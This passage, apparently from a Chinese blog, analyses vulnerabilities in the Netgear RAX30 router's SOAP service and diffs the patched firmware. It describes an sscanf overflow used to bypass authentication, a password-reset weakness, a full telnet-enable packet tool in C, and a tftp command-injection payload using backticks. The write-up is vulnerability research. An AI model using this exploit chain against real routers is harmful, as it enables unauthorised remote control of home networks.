class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v10 = cmsUtl_strlen(<span class="string">&quot;Cookie:&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !strncasecmp((<span class="type">const</span> <span class="type">char</span> *)line, <span class="string">&quot;Cookie:&quot;</span>, v10) )</span><br><span class="line">        &#123;</span><br><span class="line">          v11 = (<span class="type">const</span> <span class="type">char</span> *)sub_50D4(line);</span><br><span class="line">          v12 = (<span class="type">char</span> *)v11;</span><br><span class="line">          <span class="keyword">if</span> ( v11 )</span><br><span class="line">          &#123;</span><br><span class="line">            sub_4FB0((<span class="type">const</span> <span class="type">char</span> *)a1, v11);</span><br><span class="line">            log_log(<span class="number">7</span>, <span class="string">&quot;handle_soapRequest&quot;</span>, <span class="number">447</span>, <span class="string">&quot;token:[%s]&quot;</span>, v12);</span><br><span class="line">            <span class="built_in">free</span>(v12);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="built_in">strspn</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;line[<span class="number">2</span>] + <span class="number">3</span>, <span class="string">&quot; \\t&quot;</span>);</span><br><span class="line">      cmsUtl_strncpy(v17, (<span class="type">char</span> *)&amp;line[<span class="number">2</span>] + v6 + <span class="number">3</span>, <span class="number">2048</span>);</span><br><span class="line">      log_log(<span class="number">7</span>, <span class="string">&quot;handle_soapRequest&quot;</span>, <span class="number">432</span>, <span class="string">&quot;soapAction:[%s]&quot;</span>, v17);</span><br><span class="line">      v3 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = sub_8EC0((<span class="type">int</span>)v18);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v18[v4 + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">      sub_6F78(<span class="number">0</span>, v17, v18, a1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会将第一行给切割成method，path，protocol</p>
<p>例如：POST &#x2F;soap&#x2F;server_sa&#x2F; HTTP&#x2F;1.1，会被切割成method &#x3D; POST, path &#x3D; &#x2F;soap&#x2F;server_sa&#x2F;, protocol &#x3D; HTTP&#x2F;1.1</p>
<p>这里的sscanf发生了溢出，可以传入很大的数据来使得变量溢出</p>
<p>但是这里有一个限制，从http端口进去的时候会有一个0x800的数据限制</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> __fastcall <span class="title function_">sub_81B4</span><span class="params">(<span class="type">int</span> a1, <span class="type">void</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x800</span>u);</span><br><span class="line">  <span class="keyword">return</span> fread(s, <span class="number">1u</span>, <span class="number">0x800</span>u, *(FILE **)(a1 + <span class="number">12</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而从https端口进去的时候没有数据长度限制</p>
<p>会一直读取数据，直到发送\n</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_838C</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> error; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">bool</span> v8; <span class="comment">// cc</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [sp+4h] [bp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v9 = (<span class="type">char</span>)buf;</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x800</span>u);</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = SSL_read();</span><br><span class="line">      <span class="keyword">if</span> ( !v5 )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v5 != <span class="number">-1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      error = SSL_get_error(*(_DWORD *)(a1 + <span class="number">4</span>), <span class="number">-1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( error - <span class="number">2</span> &gt; <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = error &gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( error != <span class="number">1</span> )</span><br><span class="line">          v8 = error - <span class="number">5</span> &gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v8 )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    buf[i++] = v9;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v9 != <span class="number">10</span> );</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以就可以从https端口打进去来配合sscanf达到溢出</p>
<p>SOAP运行命令的时候需要认证</p>
<p>认证函数如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall <span class="title function_">sub_A2C0</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v19, <span class="number">0</span>, <span class="number">18</span>);</span><br><span class="line">  v2 = dword_4AB74;</span><br><span class="line">  <span class="keyword">if</span> ( !cmsUtl_strcmp(a1, <span class="string">&quot;127.0.0.1&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  LanInfo = cmsNet_getLanInfo();</span><br><span class="line">  <span class="keyword">if</span> ( LanInfo )</span><br><span class="line">  &#123;</span><br><span class="line">    log_log(<span class="number">3</span>, <span class="string">&quot;CheckAuthenticated&quot;</span>, <span class="number">207</span>, <span class="string">&quot;Fail to get %s&#x27;s IP address, ret=%d&quot;</span>, <span class="string">&quot;br0&quot;</span>, LanInfo);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = inet_ntoa(in);</span><br><span class="line">  log_log(<span class="number">7</span>, <span class="string">&quot;CheckAuthenticated&quot;</span>, <span class="number">198</span>, <span class="string">&quot;%s&#x27;s IP address = %s&quot;</span>, <span class="string">&quot;br0&quot;</span>, v4);</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务器在验证用户身份时首先检查请求是否来自127.0.0.1，如果是127.0.0.1则不需要身份验证</p>
<p>发现这个a1是可以通过上面的那个溢出达成覆盖，所以可以将a1覆盖成127.0.0.1来达到身份验证绕过</p>
<p>包如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = POST + SPACE + (<span class="string">&quot;a&quot;</span> * [REDACTED]) + SPACE + (<span class="string">&quot;b&quot;</span> * [REDACTED]) + <span class="string">&quot;127.0.0.1&quot;</span> + (<span class="string">&quot;c&quot;</span> * [REDACTED])</span><br></pre></td></tr></table></figure>

<p>同时，这个路由器还存在重置管理员密码的漏洞</p>
<p>设置路由器时，用户需要输入一个新的的密码，并给这个密码加上安全问题和答案，这些问题的答案以纯文本 (base64) 形式存储在设备配置中</p>
<p>利用前面的漏洞就可以获取配置，从而进行密码重置</p>
<p>发现了可以发送magic数据来达到telnet开启，magic发包代码如下，需要设备的MAC地址、用户名、密码，这些都可以利用之前的漏洞来得到</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This program is a re-implementation of the telnet console enabler utility</span></span><br><span class="line"><span class="comment">  for use with Netgear wireless routers.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  The original Netgear Windows binary version of this tool is available here:</span></span><br><span class="line"><span class="comment">  &lt;http://www.netgear.co.kr/Support/Product/FileInfo.asp?IDXNo=155&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Per DMCA 17 U.S.C. §1201(f)(1)-(2), the original Netgear executable was</span></span><br><span class="line"><span class="comment">  reverse engineered to enable interoperability with other operating systems</span></span><br><span class="line"><span class="comment">  not supported by the original windows-only tool (MacOS, Linux, etc).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        Netgear Router - Console Telnet Enable Utility</span></span><br><span class="line"><span class="comment">        Release 0.1 : 25th June 2006</span></span><br><span class="line"><span class="comment">        Copyright (C) 2006, yoshac @ member.fsf.org</span></span><br><span class="line"><span class="comment">        Release 0.2 : 20th August 2012</span></span><br><span class="line"><span class="comment">        dj bug fix on OS X</span></span><br><span class="line"><span class="comment">        Release 0.3 : 8th October 2012</span></span><br><span class="line"><span class="comment">        keithr-git bug fix to send entire packet in one write() call,</span></span><br><span class="line"><span class="comment">          strcpy-&gt;strncpy, clean up some whitespace</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        This program is free software; you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment">        it under the terms of the GNU General Public License as published by</span></span><br><span class="line"><span class="comment">        the Free Software Foundation; either version 2 of the License, or</span></span><br><span class="line"><span class="comment">        (at your option) any later version.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment">        but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment">        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment">        GNU General Public License for more details.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        You should have received a copy of the GNU General Public License along</span></span><br><span class="line"><span class="comment">        with this program; if not, write to the Free Software Foundation, Inc.,</span></span><br><span class="line"><span class="comment">        51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  The RSA MD5 and Blowfish implementations are provided under LGPL from</span></span><br><span class="line"><span class="comment">  &lt;http://www.opentom.org/Mkttimage&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netdb.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//#include &lt;process.h&gt;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;md5.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;blowfish.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> output_buf[<span class="number">0x640</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> BLOWFISH_CTX ctx;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PAYLOAD</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> signature[<span class="number">0x10</span>];</span><br><span class="line">  <span class="type">char</span> mac[<span class="number">0x10</span>];</span><br><span class="line">  <span class="type">char</span> username[<span class="number">0x10</span>];</span><br><span class="line">  <span class="type">char</span> password[<span class="number">0x10</span>];</span><br><span class="line">  <span class="type">char</span> reserved[<span class="number">0x40</span>];</span><br><span class="line">&#125; payload;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">usage</span><span class="params">(<span class="type">char</span> * progname)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\\nVersion:0.3, 2012/10/08\\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Usage:\\n%s &lt;host ip&gt; &lt;host mac&gt; &lt;user name&gt; &lt;password&gt;\\n\\n&quot;</span>,progname);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">socket_connect</span><span class="params">(<span class="type">char</span> *host, <span class="type">in_port_t</span> port)</span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">hp</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">  <span class="type">int</span> on = <span class="number">1</span>, sock;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((hp = gethostbyname(host)) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">    herror(<span class="string">&quot;gethostbyname&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  bcopy(hp-&gt;h_addr, &amp;addr.sin_addr, hp-&gt;h_length);</span><br><span class="line">  addr.sin_port = htons(port);</span><br><span class="line">  addr.sin_family = AF_INET;</span><br><span class="line">  sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">  setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (<span class="type">const</span> <span class="type">char</span> *)&amp;on, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">  <span class="keyword">if</span>(sock == <span class="number">-1</span>)&#123;</span><br><span class="line">    perror(<span class="string">&quot;setsockopt&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(connect(sock, (<span class="keyword">struct</span> sockaddr *)&amp;addr, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in)) == <span class="number">-1</span>)&#123;</span><br><span class="line">    perror(<span class="string">&quot;connect&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">GetOutputLength</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> lInputLong)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> lVal = lInputLong % <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (lVal!=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> lInputLong+<span class="number">8</span>-lVal;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> lInputLong;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">EncodeString</span><span class="params">(BLOWFISH_CTX *ctx,<span class="type">char</span> *pInput,<span class="type">char</span> *pOutput, <span class="type">int</span> lSize)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> SameDest = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> lCount;</span><br><span class="line">  <span class="type">int</span> lOutSize;</span><br><span class="line">  <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  lOutSize = GetOutputLength(lSize);</span><br><span class="line">  lCount=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (lCount&lt;lOutSize)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *pi=pInput;</span><br><span class="line">      <span class="type">char</span> *po=pOutput;</span><br><span class="line">      <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">        *po++=*pi++;</span><br><span class="line">      Blowfish_Encrypt(ctx,(<span class="type">uint32_t</span> *)pOutput,(<span class="type">uint32_t</span> *)(pOutput+<span class="number">4</span>));</span><br><span class="line">      pInput+=<span class="number">8</span>;</span><br><span class="line">      pOutput+=<span class="number">8</span>;</span><br><span class="line">      lCount+=<span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> lCount;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fill_payload</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * input[])</span></span><br><span class="line">&#123;</span><br><span class="line">  MD5_CTX MD;</span><br><span class="line">  <span class="type">char</span> MD5_key[<span class="number">0x10</span>];</span><br><span class="line">  <span class="type">char</span> secret_key[<span class="number">0x400</span>]=<span class="string">&quot;AMBIT_TELNET_ENABLE+&quot;</span>;</span><br><span class="line">  <span class="type">int</span> encoded_len;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;payload, <span class="number">0</span>, <span class="keyword">sizeof</span>(payload));</span><br><span class="line">  <span class="comment">// <span class="doctag">NOTE:</span> struct has .mac behind .signature and is filled here</span></span><br><span class="line">  <span class="built_in">strcpy</span>(payload.mac, input[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(payload.username, input[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc==<span class="number">5</span>)</span><br><span class="line">    <span class="built_in">strcpy</span>(payload.password, input[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">  MD5Init(&amp;MD);</span><br><span class="line">  MD5Update(&amp;MD,payload.mac,<span class="number">0x70</span>);</span><br><span class="line">  MD5Final(MD5_key,&amp;MD);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strncpy</span>(payload.signature, MD5_key, <span class="keyword">sizeof</span>(payload.signature));</span><br><span class="line">  <span class="comment">// <span class="doctag">NOTE:</span> so why concatenate outside of the .signature boundary again</span></span><br><span class="line">  <span class="comment">//       using strcat? deleting this line would keep the payload the same and not</span></span><br><span class="line">  <span class="comment">//       cause some funky abort() or segmentation fault on newer gcc&#x27;s</span></span><br><span class="line">  <span class="comment">// dj: this was attempting to put back the first byte of the MAC address</span></span><br><span class="line">  <span class="comment">// dj: which was getting stomped by the strcpy of the MD5_key above</span></span><br><span class="line">  <span class="comment">// dj: a better fix is to use strncpy to avoid the stomping in the 1st place</span></span><br><span class="line">  <span class="comment">//  strcat(payload.signature, input[2]);</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc==<span class="number">5</span>)</span><br><span class="line">    <span class="built_in">strncat</span>(secret_key,input[<span class="number">4</span>],<span class="keyword">sizeof</span>(secret_key) - <span class="built_in">strlen</span>(secret_key) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  Blowfish_Init(&amp;ctx,secret_key,<span class="built_in">strlen</span>(secret_key));</span><br><span class="line"></span><br><span class="line">  encoded_len = EncodeString(&amp;ctx,(<span class="type">char</span>*)&amp;payload,(<span class="type">char</span>*)&amp;output_buf,<span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> encoded_len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> PORT = <span class="number">23</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> datasize;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc!=<span class="number">5</span>)</span><br><span class="line">    usage(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  datasize = fill_payload(argc, argv);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> sock = socket_connect(argv[<span class="number">1</span>],PORT);</span><br><span class="line">  write(sock, output_buf, datasize);</span><br><span class="line">  close(sock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但发现telnet连接上去之后是一个受限的cli，有很多时候受限的cli里存在命令注入漏洞，看一下libcms_cli.so是否存在命令注入漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_5CC0</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v2[<span class="number">520</span>]; <span class="comment">// [sp+0h] [bp-208h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">sprintf</span>(v2, <span class="string">&quot;bcmbusybox tftp %s&quot;</span>, a1);</span><br><span class="line">  <span class="keyword">return</span> prctl_runCommandInShellBlocking(v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现在sub_5CC0里用tftp命令时存在命令注入，所以可以利用如下方式进行利用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tftp `<span class="built_in">ls</span>`</span><br></pre></td></tr></table></figure>

<p>最后达到rce效果</p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>下载fixed版本<a target="_blank" rel="noopener" href="https://www.downloads.netgear.com/files/GDC/RAX30/RAX30-V1.0.10.94_3.zip">1.0.10.94</a>，首先diff一下soap_serverd，可以看到在切割method这些数据的时候加上了%511</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( _isoc99_sscanf(v18, <span class="string">&quot;%511[^ ] %511[^ ] %511[^ ]&quot;</span>, v15, v16, v17) != 3 )</span><br></pre></td></tr></table></figure>

<p>在https输入数据的时候也进行了限制，加入了v6 &lt;&#x3D; v7这个长度判断</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 